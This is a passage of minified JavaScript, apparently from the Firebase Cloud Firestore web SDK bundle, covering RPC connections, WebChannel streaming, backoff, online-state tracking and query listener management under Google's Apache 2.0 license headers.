 */const xm="RestConnection",JF={BatchGetDocuments:"batchGet",Commit:"commit",RunQuery:"runQuery",RunAggregationQuery:"runAggregationQuery"};class XF{get fo(){return!1}constructor(e){this.databaseInfo=e,this.databaseId=e.databaseId;const t=e.ssl?"https":"http",r=encodeURIComponent(this.databaseId.projectId),i=encodeURIComponent(this.databaseId.database);this.po=t+"://"+e.host,this.yo=`projects/${r}/databases/${i}`,this.wo=this.databaseId.database===Dd?`project_id=${r}`:`project_id=${r}&database_id=${i}`}So(e,t,r,i,s){const o=Ay(),a=this.bo(e,t.toUriEncodedString());me(xm,`Sending RPC '${e}' ${o}:`,a,r);const l={"google-cloud-resource-prefix":this.yo,"x-goog-request-params":this.wo};return this.Do(l,i,s),this.vo(e,a,l,r).then(u=>(me(xm,`Received RPC '${e}' ${o}: `,u),u),u=>{throw Bl(xm,`RPC '${e}' ${o} failed with error: `,u,"url: ",a,"request:",r),u})}Co(e,t,r,i,s,o){return this.So(e,t,r,i,s)}Do(e,t,r){e["X-Goog-Api-Client"]=function(){return"gl-js/ fire/"+rc}(),e["Content-Type"]="text/plain",this.databaseInfo.appId&&(e["X-Firebase-GMPID"]=this.databaseInfo.appId),t&&t.headers.forEach((i,s)=>e[s]=i),r&&r.headers.forEach((i,s)=>e[s]=i)}bo(e,t){const r=JF[e];return`${this.po}/v1/${t}:${r}`}terminate(){}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ez{constructor(e){this.Fo=e.Fo,this.Mo=e.Mo}xo(e){this.Oo=e}No(e){this.Bo=e}Lo(e){this.ko=e}onMessage(e){this.qo=e}close(){this.Mo()}send(e){this.Fo(e)}Qo(){this.Oo()}$o(){this.Bo()}Uo(e){this.ko(e)}Ko(e){this.qo(e)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Qn="WebChannelConnection";class tz extends XF{constructor(e){super(e),this.forceLongPolling=e.forceLongPolling,this.autoDetectLongPolling=e.autoDetectLongPolling,this.useFetchStreams=e.useFetchStreams,this.longPollingOptions=e.longPollingOptions}vo(e,t,r,i){const s=Ay();return new Promise((o,a)=>{const l=new j2;l.setWithCredentials(!0),l.listenOnce(V2.COMPLETE,()=>{try{switch(l.getLastErrorCode()){case Lf.NO_ERROR:const h=l.getResponseJson();me(Qn,`XHR for RPC '${e}' ${s} received:`,JSON.stringify(h)),o(h);break;case Lf.TIMEOUT:me(Qn,`RPC '${e}' ${s} timed out`),a(new we(ie.DEADLINE_EXCEEDED,"Request time out"));break;case Lf.HTTP_ERROR:const f=l.getStatus();if(me(Qn,`RPC '${e}' ${s} failed with status:`,f,"response text:",l.getResponseText()),f>0){let m=l.getResponseJson();Array.isArray(m)&&(m=m[0]);const v=m==null?void 0:m.error;if(v&&v.status&&v.message){const x=function(I){const S=I.toLowerCase().replace(/_/g,"-");return Object.values(ie).indexOf(S)>=0?S:ie.UNKNOWN}(v.status);a(new we(x,v.message))}else a(new we(ie.UNKNOWN,"Server responded with status "+l.getStatus()))}else a(new we(ie.UNAVAILABLE,"Connection failed."));break;default:Me()}}finally{me(Qn,`RPC '${e}' ${s} completed.`)}});const u=JSON.stringify(i);me(Qn,`RPC '${e}' ${s} sending request:`,i),l.send(t,"POST",u,r,15)})}Wo(e,t,r){const i=Ay(),s=[this.po,"/","google.firestore.v1.Firestore","/",e,"/channel"],o=W2(),a=z2(),l={httpSessionIdParam:"gsessionid",initMessageHeaders:{},messageUrlParams:{database:`projects/${this.databaseId.projectId}/databases/${this.databaseId.database}`},sendRawJson:!0,supportsCrossDomainXhr:!0,internalChannelParams:{forwardChannelRequestTimeoutMs:6e5},forceLongPolling:this.forceLongPolling,detectBufferingProxy:this.autoDetectLongPolling},u=this.longPollingOptions.timeoutSeconds;u!==void 0&&(l.longPollingTimeout=Math.round(1e3*u)),this.useFetchStreams&&(l.useFetchStreams=!0),this.Do(l.initMessageHeaders,t,r),l.encodeInitMessageHeaders=!0;const h=s.join("");me(Qn,`Creating RPC '${e}' stream ${i}: ${h}`,l);const f=o.createWebChannel(h,l);let m=!1,v=!1;const x=new ez({Fo:I=>{v?me(Qn,`Not sending because RPC '${e}' stream ${i} is closed:`,I):(m||(me(Qn,`Opening RPC '${e}' stream ${i} transport.`),f.open(),m=!0),me(Qn,`RPC '${e}' stream ${i} sending:`,I),f.send(I))},Mo:()=>f.close()}),k=(I,S,b)=>{I.listen(S,E=>{try{b(E)}catch(U){setTimeout(()=>{throw U},0)}})};return k(f,zc.EventType.OPEN,()=>{v||(me(Qn,`RPC '${e}' stream ${i} transport opened.`),x.Qo())}),k(f,zc.EventType.CLOSE,()=>{v||(v=!0,me(Qn,`RPC '${e}' stream ${i} transport closed`),x.Uo())}),k(f,zc.EventType.ERROR,I=>{v||(v=!0,Bl(Qn,`RPC '${e}' stream ${i} transport errored:`,I),x.Uo(new we(ie.UNAVAILABLE,"The operation could not be completed")))}),k(f,zc.EventType.MESSAGE,I=>{var S;if(!v){const b=I.data[0];st(!!b);const E=b,U=(E==null?void 0:E.error)||((S=E[0])===null||S===void 0?void 0:S.error);if(U){me(Qn,`RPC '${e}' stream ${i} received error:`,U);const H=U.status;let q=function(B){const z=an[B];if(z!==void 0)return Tk(z)}(H),L=U.message;q===void 0&&(q=ie.INTERNAL,L="Unknown error status: "+H+" with message "+U.message),v=!0,x.Uo(new we(q,L)),f.close()}else me(Qn,`RPC '${e}' stream ${i} received:`,b),x.Ko(b)}}),k(a,F2.STAT_EVENT,I=>{I.stat===fy.PROXY?me(Qn,`RPC '${e}' stream ${i} detected buffering proxy`):I.stat===fy.NOPROXY&&me(Qn,`RPC '${e}' stream ${i} detected no buffering proxy`)}),setTimeout(()=>{x.$o()},0),x}}function km(){return typeof document<"u"?document:null}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Qp(n){return new sF(n,!0)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Uk{constructor(e,t,r=1e3,i=1.5,s=6e4){this.Ti=e,this.timerId=t,this.Go=r,this.zo=i,this.jo=s,this.Ho=0,this.Jo=null,this.Yo=Date.now(),this.reset()}reset(){this.Ho=0}Zo(){this.Ho=this.jo}Xo(e){this.cancel();const t=Math.floor(this.Ho+this.e_()),r=Math.max(0,Date.now()-this.Yo),i=Math.max(0,t-r);i>0&&me("ExponentialBackoff",`Backing off for ${i} ms (base delay: ${this.Ho} ms, delay with jitter: ${t} ms, last attempt: ${r} ms ago)`),this.Jo=this.Ti.enqueueAfterDelay(this.timerId,i,()=>(this.Yo=Date.now(),e())),this.Ho*=this.zo,this.Ho<this.Go&&(this.Ho=this.Go),this.Ho>this.jo&&(this.Ho=this.jo)}t_(){this.Jo!==null&&(this.Jo.skipDelay(),this.Jo=null)}cancel(){this.Jo!==null&&(this.Jo.cancel(),this.Jo=null)}e_(){return(Math.random()-.5)*this.Ho}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const rS="PersistentStream";class jk{constructor(e,t,r,i,s,o,a,l){this.Ti=e,this.n_=r,this.r_=i,this.connection=s,this.authCredentialsProvider=o,this.appCheckCredentialsProvider=a,this.listener=l,this.state=0,this.i_=0,this.s_=null,this.o_=null,this.stream=null,this.__=0,this.a_=new Uk(e,t)}u_(){return this.state===1||this.state===5||this.c_()}c_(){return this.state===2||this.state===3}start(){this.__=0,this.state!==4?this.auth():this.l_()}async stop(){this.u_()&&await this.close(0)}h_(){this.state=0,this.a_.reset()}P_(){this.c_()&&this.s_===null&&(this.s_=this.Ti.enqueueAfterDelay(this.n_,6e4,()=>this.T_()))}I_(e){this.E_(),this.stream.send(e)}async T_(){if(this.c_())return this.close(0)}E_(){this.s_&&(this.s_.cancel(),this.s_=null)}d_(){this.o_&&(this.o_.cancel(),this.o_=null)}async close(e,t){this.E_(),this.d_(),this.a_.cancel(),this.i_++,e!==4?this.a_.reset():t&&t.code===ie.RESOURCE_EXHAUSTED?(fs(t.toString()),fs("Using maximum backoff delay to prevent overloading the backend."),this.a_.Zo()):t&&t.code===ie.UNAUTHENTICATED&&this.state!==3&&(this.authCredentialsProvider.invalidateToken(),this.appCheckCredentialsProvider.invalidateToken()),this.stream!==null&&(this.A_(),this.stream.close(),this.stream=null),this.state=e,await this.listener.Lo(t)}A_(){}auth(){this.state=1;const e=this.R_(this.i_),t=this.i_;Promise.all([this.authCredentialsProvider.getToken(),this.appCheckCredentialsProvider.getToken()]).then(([r,i])=>{this.i_===t&&this.V_(r,i)},r=>{e(()=>{const i=new we(ie.UNKNOWN,"Fetching auth token failed: "+r.message);return this.m_(i)})})}V_(e,t){const r=this.R_(this.i_);this.stream=this.f_(e,t),this.stream.xo(()=>{r(()=>this.listener.xo())}),this.stream.No(()=>{r(()=>(this.state=2,this.o_=this.Ti.enqueueAfterDelay(this.r_,1e4,()=>(this.c_()&&(this.state=3),Promise.resolve())),this.listener.No()))}),this.stream.Lo(i=>{r(()=>this.m_(i))}),this.stream.onMessage(i=>{r(()=>++this.__==1?this.g_(i):this.onNext(i))})}l_(){this.state=5,this.a_.Xo(async()=>{this.state=0,this.start()})}m_(e){return me(rS,`close with error: ${e}`),this.stream=null,this.close(4,e)}R_(e){return t=>{this.Ti.enqueueAndForget(()=>this.i_===e?t():(me(rS,"stream callback skipped by getCloseGuardedDispatcher."),Promise.resolve()))}}}class nz extends jk{constructor(e,t,r,i,s,o){super(e,"listen_stream_connection_backoff","listen_stream_idle","health_check_timeout",t,r,i,o),this.serializer=s}f_(e,t){return this.connection.Wo("Listen",e,t)}g_(e){return this.onNext(e)}onNext(e){this.a_.reset();const t=lF(this.serializer,e),r=function(s){if(!("targetChange"in s))return De.min();const o=s.targetChange;return o.targetIds&&o.targetIds.length?De.min():o.readTime?xi(o.readTime):De.min()}(e);return this.listener.p_(t,r)}y_(e){const t={};t.database=Sy(this.serializer),t.addTarget=function(s,o){let a;const l=o.target;if(a=yy(l)?{documents:hF(s,l)}:{query:fF(s,l).ht},a.targetId=o.targetId,o.resumeToken.approximateByteSize()>0){a.resumeToken=xk(s,o.resumeToken);const u=_y(s,o.expectedCount);u!==null&&(a.expectedCount=u)}else if(o.snapshotVersion.compareTo(De.min())>0){a.readTime=Fd(s,o.snapshotVersion.toTimestamp());const u=_y(s,o.expectedCount);u!==null&&(a.expectedCount=u)}return a}(this.serializer,e);const r=pF(this.serializer,e);r&&(t.labels=r),this.I_(t)}w_(e){const t={};t.database=Sy(this.serializer),t.removeTarget=e,this.I_(t)}}class rz extends jk{constructor(e,t,r,i,s,o){super(e,"write_stream_connection_backoff","write_stream_idle","health_check_timeout",t,r,i,o),this.serializer=s}get S_(){return this.__>0}start(){this.lastStreamToken=void 0,super.start()}A_(){this.S_&&this.b_([])}f_(e,t){return this.connection.Wo("Write",e,t)}g_(e){return st(!!e.streamToken),this.lastStreamToken=e.streamToken,st(!e.writeResults||e.writeResults.length===0),this.listener.D_()}onNext(e){st(!!e.streamToken),this.lastStreamToken=e.streamToken,this.a_.reset();const t=uF(e.writeResults,e.commitTime),r=xi(e.commitTime);return this.listener.v_(r,t)}C_(){const e={};e.database=Sy(this.serializer),this.I_(e)}b_(e){const t={streamToken:this.lastStreamToken,writes:e.map(r=>cF(this.serializer,r))};this.I_(t)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class iz{}class sz extends iz{constructor(e,t,r,i){super(),this.authCredentials=e,this.appCheckCredentials=t,this.connection=r,this.serializer=i,this.F_=!1}M_(){if(this.F_)throw new we(ie.FAILED_PRECONDITION,"The client has already been terminated.")}So(e,t,r,i){return this.M_(),Promise.all([this.authCredentials.getToken(),this.appCheckCredentials.getToken()]).then(([s,o])=>this.connection.So(e,Ey(t,r),i,s,o)).catch(s=>{throw s.name==="FirebaseError"?(s.code===ie.UNAUTHENTICATED&&(this.authCredentials.invalidateToken(),this.appCheckCredentials.invalidateToken()),s):new we(ie.UNKNOWN,s.toString())})}Co(e,t,r,i,s){return this.M_(),Promise.all([this.authCredentials.getToken(),this.appCheckCredentials.getToken()]).then(([o,a])=>this.connection.Co(e,Ey(t,r),i,o,a,s)).catch(o=>{throw o.name==="FirebaseError"?(o.code===ie.UNAUTHENTICATED&&(this.authCredentials.invalidateToken(),this.appCheckCredentials.invalidateToken()),o):new we(ie.UNKNOWN,o.toString())})}terminate(){this.F_=!0,this.connection.terminate()}}class oz{constructor(e,t){this.asyncQueue=e,this.onlineStateHandler=t,this.state="Unknown",this.x_=0,this.O_=null,this.N_=!0}B_(){this.x_===0&&(this.L_("Unknown"),this.O_=this.asyncQueue.enqueueAfterDelay("online_state_timeout",1e4,()=>(this.O_=null,this.k_("Backend didn't respond within 10 seconds."),this.L_("Offline"),Promise.resolve())))}q_(e){this.state==="Online"?this.L_("Unknown"):(this.x_++,this.x_>=1&&(this.Q_(),this.k_(`Connection failed 1 times. Most recent error: ${e.toString()}`),this.L_("Offline")))}set(e){this.Q_(),this.x_=0,e==="Online"&&(this.N_=!1),this.L_(e)}L_(e){e!==this.state&&(this.state=e,this.onlineStateHandler(e))}k_(e){const t=`Could not reach Cloud Firestore backend. ${e}
This typically indicates that your device does not have a healthy Internet connection at the moment. The client will operate in offline mode until it is able to successfully connect to the backend.`;this.N_?(fs(t),this.N_=!1):me("OnlineStateTracker",t)}Q_(){this.O_!==null&&(this.O_.cancel(),this.O_=null)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const la="RemoteStore";class az{constructor(e,t,r,i,s){this.localStore=e,this.datastore=t,this.asyncQueue=r,this.remoteSyncer={},this.U_=[],this.K_=new Map,this.W_=new Set,this.G_=[],this.z_=s,this.z_.To(o=>{r.enqueueAndForget(async()=>{_a(this)&&(me(la,"Restarting streams for network reachability change."),await async function(l){const u=Be(l);u.W_.add(4),await mh(u),u.j_.set("Unknown"),u.W_.delete(4),await Yp(u)}(this))})}),this.j_=new oz(r,i)}}async function Yp(n){if(_a(n))for(const e of n.G_)await e(!0)}async function mh(n){for(const e of n.G_)await e(!1)}function Vk(n,e){const t=Be(n);t.K_.has(e.targetId)||(t.K_.set(e.targetId,e),jv(t)?Uv(t):oc(t).c_()&&Bv(t,e))}function Ov(n,e){const t=Be(n),r=oc(t);t.K_.delete(e),r.c_()&&Fk(t,e),t.K_.size===0&&(r.c_()?r.P_():_a(t)&&t.j_.set("Unknown"))}function Bv(n,e){if(n.H_.Ne(e.targetId),e.resumeToken.approximateByteSize()>0||e.snapshotVersion.compareTo(De.min())>0){const t=n.remoteSyncer.getRemoteKeysForTarget(e.targetId).size;e=e.withExpectedCount(t)}oc(n).y_(e)}function Fk(n,e){n.H_.Ne(e),oc(n).w_(e)}function Uv(n){n.H_=new tF({getRemoteKeysForTarget:e=>n.remoteSyncer.getRemoteKeysForTarget(e),lt:e=>n.K_.get(e)||null,it:()=>n.datastore.serializer.databaseId}),oc(n).start(),n.j_.B_()}function jv(n){return _a(n)&&!oc(n).u_()&&n.K_.size>0}function _a(n){return Be(n).W_.size===0}function zk(n){n.H_=void 0}async function lz(n){n.j_.set("Online")}async function cz(n){n.K_.forEach((e,t)=>{Bv(n,e)})}async function uz(n,e){zk(n),jv(n)?(n.j_.q_(e),Uv(n)):n.j_.set("Unknown")}async function hz(n,e,t){if(n.j_.set("Online"),e instanceof bk&&e.state===2&&e.cause)try{await async function(i,s){const o=s.cause;for(const a of s.targetIds)i.K_.has(a)&&(await i.remoteSyncer.rejectListen(a,o),i.K_.delete(a),i.H_.removeTarget(a))}(n,e)}catch(r){me(la,"Failed to remove targets %s: %s ",e.targetIds.join(","),r),await Wd(n,r)}else if(e instanceof Uf?n.H_.We(e):e instanceof Ak?n.H_.Ze(e):n.H_.je(e),!t.isEqual(De.min()))try{const r=await Bk(n.localStore);t.compareTo(r)>=0&&await function(s,o){const a=s.H_.ot(o);return a.targetChanges.forEach((l,u)=>{if(l.resumeToken.approximateByteSize()>0){const h=s.K_.get(u);h&&s.K_.set(u,h.withResumeToken(l.resumeToken,o))}}),a.targetMismatches.forEach((l,u)=>{const h=s.K_.get(l);if(!h)return;s.K_.set(l,h.withResumeToken(Vn.EMPTY_BYTE_STRING,h.snapshotVersion)),Fk(s,l);const f=new zs(h.target,l,u,h.sequenceNumber);Bv(s,f)}),s.remoteSyncer.applyRemoteEvent(a)}(n,t)}catch(r){me(la,"Failed to raise snapshot:",r),await Wd(n,r)}}async function Wd(n,e,t){if(!sc(e))throw e;n.W_.add(1),await mh(n),n.j_.set("Offline"),t||(t=()=>Bk(n.localStore)),n.asyncQueue.enqueueRetryable(async()=>{me(la,"Retrying IndexedDB access"),await t(),n.W_.delete(1),await Yp(n)})}function Wk(n,e){return e().catch(t=>Wd(n,t,e))}async function Zp(n){const e=Be(n),t=fo(e);let r=e.U_.length>0?e.U_[e.U_.length-1].batchId:Iv;for(;fz(e);)try{const i=await KF(e.localStore,r);if(i===null){e.U_.length===0&&t.P_();break}r=i.batchId,dz(e,i)}catch(i){await Wd(e,i)}$k(e)&&Hk(e)}function fz(n){return _a(n)&&n.U_.length<10}function dz(n,e){n.U_.push(e);const t=fo(n);t.c_()&&t.S_&&t.b_(e.mutations)}function $k(n){return _a(n)&&!fo(n).u_()&&n.U_.length>0}function Hk(n){fo(n).start()}async function pz(n){fo(n).C_()}async function gz(n){const e=fo(n);for(const t of n.U_)e.b_(t.mutations)}async function mz(n,e,t){const r=n.U_.shift(),i=Cv.from(r,e,t);await Wk(n,()=>n.remoteSyncer.applySuccessfulWrite(i)),await Zp(n)}async function yz(n,e){e&&fo(n).S_&&await async function(r,i){if(function(o){return XV(o)&&o!==ie.ABORTED}(i.code)){const s=r.U_.shift();fo(r).h_(),await Wk(r,()=>r.remoteSyncer.rejectFailedWrite(s.batchId,i)),await Zp(r)}}(n,e),$k(n)&&Hk(n)}async function iS(n,e){const t=Be(n);t.asyncQueue.verifyOperationInProgress(),me(la,"RemoteStore received new credentials");const r=_a(t);t.W_.add(3),await mh(t),r&&t.j_.set("Unknown"),await t.remoteSyncer.handleCredentialChange(e),t.W_.delete(3),await Yp(t)}async function wz(n,e){const t=Be(n);e?(t.W_.delete(2),await Yp(t)):e||(t.W_.add(2),await mh(t),t.j_.set("Unknown"))}function oc(n){return n.J_||(n.J_=function(t,r,i){const s=Be(t);return s.M_(),new nz(r,s.connection,s.authCredentials,s.appCheckCredentials,s.serializer,i)}(n.datastore,n.asyncQueue,{xo:lz.bind(null,n),No:cz.bind(null,n),Lo:uz.bind(null,n),p_:hz.bind(null,n)}),n.G_.push(async e=>{e?(n.J_.h_(),jv(n)?Uv(n):n.j_.set("Unknown")):(await n.J_.stop(),zk(n))})),n.J_}function fo(n){return n.Y_||(n.Y_=function(t,r,i){const s=Be(t);return s.M_(),new rz(r,s.connection,s.authCredentials,s.appCheckCredentials,s.serializer,i)}(n.datastore,n.asyncQueue,{xo:()=>Promise.resolve(),No:pz.bind(null,n),Lo:yz.bind(null,n),D_:gz.bind(null,n),v_:mz.bind(null,n)}),n.G_.push(async e=>{e?(n.Y_.h_(),await Zp(n)):(await n.Y_.stop(),n.U_.length>0&&(me(la,`Stopping write stream with ${n.U_.length} pending writes`),n.U_=[]))})),n.Y_}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Vv{constructor(e,t,r,i,s){this.asyncQueue=e,this.timerId=t,this.targetTimeMs=r,this.op=i,this.removalCallback=s,this.deferred=new ns,this.then=this.deferred.promise.then.bind(this.deferred.promise),this.deferred.promise.catch(o=>{})}get promise(){return this.deferred.promise}static createAndSchedule(e,t,r,i,s){const o=Date.now()+r,a=new Vv(e,t,o,i,s);return a.start(r),a}start(e){this.timerHandle=setTimeout(()=>this.handleDelayElapsed(),e)}skipDelay(){return this.handleDelayElapsed()}cancel(e){this.timerHandle!==null&&(this.clearTimeout(),this.deferred.reject(new we(ie.CANCELLED,"Operation cancelled"+(e?": "+e:""))))}handleDelayElapsed(){this.asyncQueue.enqueueAndForget(()=>this.timerHandle!==null?(this.clearTimeout(),this.op().then(e=>this.deferred.resolve(e))):Promise.resolve())}clearTimeout(){this.timerHandle!==null&&(this.removalCallback(this),clearTimeout(this.timerHandle),this.timerHandle=null)}}function Fv(n,e){if(fs("AsyncQueue",`${e}: ${n}`),sc(n))return new we(ie.UNAVAILABLE,`${e}: ${n}`);throw n}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class wl{static emptySet(e){return new wl(e.comparator)}constructor(e){this.comparator=e?(t,r)=>e(t,r)||Se.comparator(t.key,r.key):(t,r)=>Se.comparator(t.key,r.key),this.keyedMap=Wc(),this.sortedSet=new Qt(this.comparator)}has(e){return this.keyedMap.get(e)!=null}get(e){return this.keyedMap.get(e)}first(){return this.sortedSet.minKey()}last(){return this.sortedSet.maxKey()}isEmpty(){return this.sortedSet.isEmpty()}indexOf(e){const t=this.keyedMap.get(e);return t?this.sortedSet.indexOf(t):-1}get size(){return this.sortedSet.size}forEach(e){this.sortedSet.inorderTraversal((t,r)=>(e(t),!1))}add(e){const t=this.delete(e.key);return t.copy(t.keyedMap.insert(e.key,e),t.sortedSet.insert(e,null))}delete(e){const t=this.get(e);return t?this.copy(this.keyedMap.remove(e),this.sortedSet.remove(t)):this}isEqual(e){if(!(e instanceof wl)||this.size!==e.size)return!1;const t=this.sortedSet.getIterator(),r=e.sortedSet.getIterator();for(;t.hasNext();){const i=t.getNext().key,s=r.getNext().key;if(!i.isEqual(s))return!1}return!0}toString(){const e=[];return this.forEach(t=>{e.push(t.toString())}),e.length===0?"DocumentSet ()":`DocumentSet (
  `+e.join(`  
`)+`
)`}copy(e,t){const r=new wl;return r.comparator=this.comparator,r.keyedMap=e,r.sortedSet=t,r}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class sS{constructor(){this.Z_=new Qt(Se.comparator)}track(e){const t=e.doc.key,r=this.Z_.get(t);r?e.type!==0&&r.type===3?this.Z_=this.Z_.insert(t,e):e.type===3&&r.type!==1?this.Z_=this.Z_.insert(t,{type:r.type,doc:e.doc}):e.type===2&&r.type===2?this.Z_=this.Z_.insert(t,{type:2,doc:e.doc}):e.type===2&&r.type===0?this.Z_=this.Z_.insert(t,{type:0,doc:e.doc}):e.type===1&&r.type===0?this.Z_=this.Z_.remove(t):e.type===1&&r.type===2?this.Z_=this.Z_.insert(t,{type:1,doc:r.doc}):e.type===0&&r.type===1?this.Z_=this.Z_.insert(t,{type:2,doc:e.doc}):Me():this.Z_=this.Z_.insert(t,e)}X_(){const e=[];return this.Z_.inorderTraversal((t,r)=>{e.push(r)}),e}}class zl{constructor(e,t,r,i,s,o,a,l,u){this.query=e,this.docs=t,this.oldDocs=r,this.docChanges=i,this.mutatedKeys=s,this.fromCache=o,this.syncStateChanged=a,this.excludesMetadataChanges=l,this.hasCachedResults=u}static fromInitialDocuments(e,t,r,i,s){const o=[];return t.forEach(a=>{o.push({type:0,doc:a})}),new zl(e,t,wl.emptySet(t),o,r,i,!0,!1,s)}get hasPendingWrites(){return!this.mutatedKeys.isEmpty()}isEqual(e){if(!(this.fromCache===e.fromCache&&this.hasCachedResults===e.hasCachedResults&&this.syncStateChanged===e.syncStateChanged&&this.mutatedKeys.isEqual(e.mutatedKeys)&&$p(this.query,e.query)&&this.docs.isEqual(e.docs)&&this.oldDocs.isEqual(e.oldDocs)))return!1;const t=this.docChanges,r=e.docChanges;if(t.length!==r.length)return!1;for(let i=0;i<t.length;i++)if(t[i].type!==r[i].type||!t[i].doc.isEqual(r[i].doc))return!1;return!0}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class vz{constructor(){this.ea=void 0,this.ta=[]}na(){return this.ta.some(e=>e.ra())}}class _z{constructor(){this.queries=oS(),this.onlineState="Unknown",this.ia=new Set}terminate(){(function(t,r){const i=Be(t),s=i.queries;i.queries=oS(),s.forEach((o,a)=>{for(const l of a.ta)l.onError(r)})})(this,new we(ie.ABORTED,"Firestore shutting down"))}}function oS(){return new va(n=>hk(n),$p)}async function qk(n,e){const t=Be(n);let r=3;const i=e.query;let s=t.queries.get(i);s?!s.na()&&e.ra()&&(r=2):(s=new vz,r=e.ra()?0:1);try{switch(r){case 0:s.ea=await t.onListen(i,!0);break;case 1:s.ea=await t.onListen(i,!1);break;case 2:await t.onFirstRemoteStoreListen(i)}}catch(o){const a=Fv(o,`Initialization of query '${Va(e.query)}' failed`);return void e.onError(a)}t.queries.set(i,s),s.ta.push(e),e.sa(t.onlineState),s.ea&&e.oa(s.ea)&&zv(t)}async function Kk(n,e){const t=Be(n),r=e.query;let i=3;const s=t.queries.get(r);if(s){const o=s.ta.indexOf(e);o>=0&&(s.ta.splice(o,1),s.ta.length===0?i=e.ra()?0:1:!s.na()&&e.ra()&&(i=2))}switch(i){case 0:return t.queries.delete(r),t.onUnlisten(r,!0);case 1:return t.queries.delete(r),t.onUnlisten(r,!1);case 2:return t.onLastRemoteStoreUnlisten(r);default:return}}function Ez(n,e){const t=Be(n);let r=!1;for(const i of e){const s=i.query,o=t.queries.get(s);if(o){for(const a of o.ta)a.oa(i)&&(r=!0);o.ea=i}}r&&zv(t)}function Iz(n,e,t){const r=Be(n),i=r.queries.get(e);if(i)for(const s of i.ta)s.onError(t);r.queries.delete(e)}function zv(n){n.ia.forEach(e=>{e.next()})}var by,aS;(aS=by||(by={}))._a="default",aS.Cache="cache";class 